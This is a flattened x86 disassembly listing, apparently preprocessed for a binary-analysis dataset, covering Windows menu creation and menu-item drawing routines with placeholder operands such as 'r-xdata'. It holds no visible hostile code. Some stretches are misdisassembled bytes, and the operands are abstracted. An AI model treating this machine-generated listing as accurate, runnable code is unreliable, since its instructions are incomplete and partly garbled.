mov edx [ r-xdata ]
call sub_4033cc
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_450408
push ebx
mov ebx eax
mov eax ebx
call sub_44cf04
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45043c
push ebx
mov ebx eax
mov eax ebx
call sub_44cf18
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_450470
push ebx
mov ebx eax
mov eax ebx
call sub_44cf2c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4504a4
push ebx
mov ebx eax
mov eax ebx
call sub_42042c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4504cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_4504ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45252c
sub_45050c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45259c
sub_45052c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4525f0
sub_45054c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_450568
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fc0
sub_45058c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45271c
sub_4505ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4526f8
sub_4505cc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45270c
sub_4505ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_450618
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fb3c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_450104
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_453028
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_450694
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45506c
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4526c4
test eax eax
jg r-xdata
mov edx esi
call sub_452a5c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_4526d4
call sub_40321c
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_40321c
lea eax [ esi + 0x44 ]
call sub_40d3ac
lea eax [ esi + 0x78 ]
call sub_40d3ac
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_450ab0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41a670
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fb88
test bl bl
jle r-xdata
call sub_40321c
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_450748
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4509a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4509aa
lea eax [ ebp - 0x40 ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404004
mov eax ebx
call sub_4526c4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_450c58
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404378
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4526c4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_452c80
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44fdac
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042ec
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40442c
push eax
mov eax ebx
call sub_450c58
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45229c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404378
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40442c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_4526c4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_450c58
mov [ ebp - 0x25 ] eax
sub_4509c3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_450748
xor eax eax
pop ebp
retn
sub_4509e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4542bc
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453284
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_453780
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_450184
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_450a58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_450aa2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41ec6c
mov eax [ ebp - 0x4 ]
call sub_45000c
mov edx eax
mov eax ebx
call sub_4526f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450aa9
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_450ab0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_450b28
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41fc0c
sub_450aec
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ff8c
mov eax ebx
call sub_4526ac
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4526ac
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403418
pop esi
pop ebx
retn
mov eax ebx
call sub_450b28
sub_450b28
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_450c58
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_450b28
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_450c58
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_450c58
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_4509e8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebp
call sub_450c58
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_450bf8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4526c4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_4526d4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_4526d4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_4526d4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44fd00
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_450c58
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_4509e8
mov eax [ rw-data ]
call sub_44fd00
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_450ca4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41feb4
push ebx
push sub_450a58
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_450ce8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_450ecc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_452c80
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404004
test bh 0x4
je r-xdata
mov eax edi
call sub_4542bc
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4237a0
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404234
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423178
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423184
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450ed3
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_423dcc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_423dcc
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422eb8
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40422c
push eax
mov eax [ ebp - 0xc ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_423dcc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_422eb8
mov eax 0xff00000d
call sub_4229f8
mov esi eax
mov eax 0xff000010
call sub_4229f8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422eb8
jmp r-xdata
sub_450f38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_451820
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423684
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422eb8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423684
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423a28
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44dcfc
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423dcc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_42367c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423684
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45137f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
